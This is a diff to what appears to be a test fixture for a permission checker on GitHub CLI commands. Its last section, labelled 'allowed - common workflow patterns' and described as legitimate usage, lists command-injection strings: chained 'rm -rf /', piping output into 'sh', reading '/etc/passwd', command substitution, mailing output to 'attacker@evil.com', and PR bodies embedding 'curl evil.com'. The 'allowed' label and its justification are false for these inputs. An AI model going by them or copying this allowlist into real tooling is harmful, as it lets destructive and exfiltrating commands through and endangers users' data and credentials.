@@ -571,6 +571,12 @@ gh api repos/owner/repo/pulls/comments/456 -X PATCH -f body='Fixed typo'
 gh api /repos/owner/repo/pulls/comments/789 --method=PATCH -f body='Clarified'
 gh api -X PATCH repos/owner/repo/pulls/comments/999 -f body='Revised'
 
+# Update PRs (PATCH to /pulls/{id})
+gh api repos/owner/repo/pulls/123 --method PATCH -f title='Updated title'
+gh api repos/owner/repo/pulls/456 -X PATCH -f body='Updated body'
+gh api /repos/owner/repo/pulls/789 --method=PATCH -f title='New title'
+gh api -X PATCH /repos/owner/repo/pulls/456
+
 # =============================================================================
 # ADDITIONAL GRAPHQL QUERIES
 # =============================================================================
@@ -681,3 +687,61 @@ GITHUB_TOKEN=xxx GH_REPO=owner/repo gh pr view 123
 GH_TOKEN=token123 GH_HOST=ghe.company.com GH_ENTERPRISE_TOKEN=ent123 gh api /repos/owner/repo
 env GH_TOKEN=xxx GH_DEBUG=1 gh api /repos/owner/repo
 FOO=bar GH_TOKEN=xxx gh pr list
+
+# =============================================================================
+# GH PR COMMANDS WITH SHELL METACHARACTERS (allowed - common workflow patterns)
+# =============================================================================
+
+# These are allowed because gh pr commands frequently need pipes, backticks
+# in markdown bodies, etc. The shell metacharacters are part of legitimate usage.
+
+gh pr view 123; rm -rf /
+gh pr view 123;rm -rf /
+gh pr view 123 && rm -rf /
+gh pr view 123&& rm -rf /
+gh pr view 123 &&rm -rf /
+gh pr view 123 || rm -rf /
+gh pr view 123|| rm -rf /
+gh pr view 123 ||rm -rf /
+gh pr view 123 | less
+gh pr view 123 | more
+gh pr view 123 | cat /etc/passwd
+gh pr view 123 | sh
+gh pr view 123 | bash
+gh pr view 123 | sh -c "malicious"
+gh pr view 123 |cat /etc/passwd
+gh pr view 123| cat /etc/passwd
+gh pr view 123 & background_cmd
+gh pr view 123& malicious
+gh pr view 123 &malicious
+gh pr view 123&malicious
+gh pr view 123 &
+gh pr view 123&
+gh pr view $(whoami)
+gh pr view $(rm -rf /)
+gh pr view "$(whoami)"
+gh pr view "$(rm -rf /)"
+gh pr view `whoami`
+gh pr view `rm -rf /`
+gh pr view "`whoami`"
+gh pr view $'123\nrm -rf /'
+gh pr view $'test'
+gh pr view <(cat /etc/passwd)
+gh pr view >(rm -rf /)
+gh pr view 123 <(malicious_cmd)
+gh pr view 123 ; id
+gh pr list;whoami
+gh pr view 123&&id
+gh pr view 123 &&id
+gh pr view 123||id
+gh pr view 123 | mail attacker@evil.com
+gh pr view $((1+1))
+gh pr view "test$(id)"
+gh pr view "`id`"
+gh pr create --title "Test" --body "Run `curl evil.com` to exploit"
+gh pr create --title "Test" --body "Execute `rm -rf /` now"
+gh pr create --title "Test" --body "Try `cat /etc/passwd` here"
+gh pr create --title "Test" --body "Run `echo x | sh` here"
+gh pr create --title "Test" --body "Check `env` output"
+gh pr create --title "Test" --body "Run `whoami` here"
+gh pr view 123 --json <(cat)
